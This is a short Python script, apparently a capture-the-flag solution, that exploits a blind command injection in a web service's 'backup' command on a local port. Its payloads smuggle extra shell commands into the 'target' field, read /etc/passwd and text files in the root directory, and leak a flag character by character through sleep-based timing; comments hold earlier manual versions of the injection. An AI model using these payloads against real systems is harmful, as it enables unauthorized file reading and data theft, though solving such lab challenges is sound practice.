from requests import post, exceptions

# 127.0.0.1; echo $(perl -e 'printf "%b\n",'$(printf "%d\n" \'$(cat /*.txt | cut -c1)))
# aa /etc/passwd; if [ $(perl -e 'printf "%b\n",'$(printf "%d\n" \'$(cat /*.txt | cut -c1)) | cut -c1) = "0" ]; then echo "ok"; else echo "zip error"; fi; #
# aa /etc/passwd; if [ $(expr length $(perl -e 'printf "%b\n",'$(printf "%d\n" \'$(cat /*.txt | cut -c1)))) = "7" ]; then echo "ok"; else echo "zip error"; fi; #

url = "http://127.0.0.1:3007"

flag = ""

def binToChar(bin):
	return chr(int(bin, 2))

NULL = binToChar("011111")

for char_index in range(1, 1000):
	try:
		char = ""
		payload = '''aa /etc/passwd; if [ $(expr length $(perl -e 'printf "%b",'$(printf "%d" \\'$(cat /*.txt | cut -c{0})))) = "7" ]; then sleep 2; else echo "zip error"; fi; #'''.format(char_index)
		post(url, data={
			"command": "backup",
			"target": payload
		}, timeout=0.5)
		bits = 6
	except exceptions.Timeout:
		bits = 7
	for bit_index in range(1, bits+1):
		try:
			payload = '''aa /etc/passwd; if [ $(perl -e 'printf "%b",'$(printf "%d" \\'$(cat /*.txt | cut -c{0})) | cut -c{1}) = "0" ]; then sleep 2; else echo "zip error"; fi; #'''.format(char_index, bit_index)
			r = post(url, data={
				"command": "backup",
				"target": payload
			}, timeout=0.5)
			char += "1"
		except exceptions.Timeout:
			char += "0"
		print(char)
	char = binToChar(char)
	if char == NULL:
		print("flag found => " + flag)
		exit()
	print("found char => " + char)
	flag += char 